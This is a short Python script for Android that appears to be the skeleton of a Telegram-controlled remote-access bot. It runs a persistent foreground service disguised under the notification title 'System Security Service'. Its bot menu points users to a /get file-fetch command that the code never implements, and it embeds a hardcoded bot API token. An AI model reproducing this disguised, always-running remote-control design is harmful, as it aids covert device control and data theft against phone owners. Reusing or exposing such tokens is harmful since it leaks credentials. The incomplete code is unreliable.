import telebot, os, json, uuid, shutil, time
from telebot import types
from jnius import autoclass

# إعداد الخدمة الأمامية (Foreground Service)
Service = autoclass('org.kivy.android.PythonService').mService
def start_foreground():
    builder = autoclass('android.app.Notification$Builder')(Service)
    builder.setContentTitle("System Security Service")
    builder.setContentText("Status: Operational")
    builder.setSmallIcon(17301642)
    Service.startForeground(1, builder.build())
start_foreground()

TOKEN = '8562860131:AAGAonv0gpqYnhMkQBp8aMhuhToH_qgjO1s'
bot = telebot.TeleBot(TOKEN)
DB_PATH = '/sdcard/device_config.json'

def get_name():
    if os.path.exists(DB_PATH):
        with open(DB_PATH, 'r') as f: return json.load(f).get("name", "Unknown")
    return "Unknown"

# لوحة التحكم الرئيسية
def get_markup():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📂 استعراض", callback_data="files"),
               types.InlineKeyboardButton("✏️ تغيير الاسم", callback_data="rename"))
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, f"🚀 النظام نشط | الجهاز: {get_name()}", reply_markup=get_markup())

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    if call.data == "files":
        bot.answer_callback_query(call.id, "أرسل /get متبوعاً باسم الملف")
    elif call.data == "rename":
        bot.answer_callback_query(call.id, "استخدم الأمر: /rename [الاسم الجديد]")

@bot.message_handler(commands=['rename'])
def rename(message):
    new_name = message.text.split(' ', 1)[-1]
    with open(DB_PATH, 'w') as f: json.dump({"name": new_name}, f)
    bot.reply_to(message, f"✅ تم تغيير الاسم إلى: {new_name}")

# حلقة التشغيل
while True:
    try: bot.polling(none_stop=True)
    except: time.sleep(10)

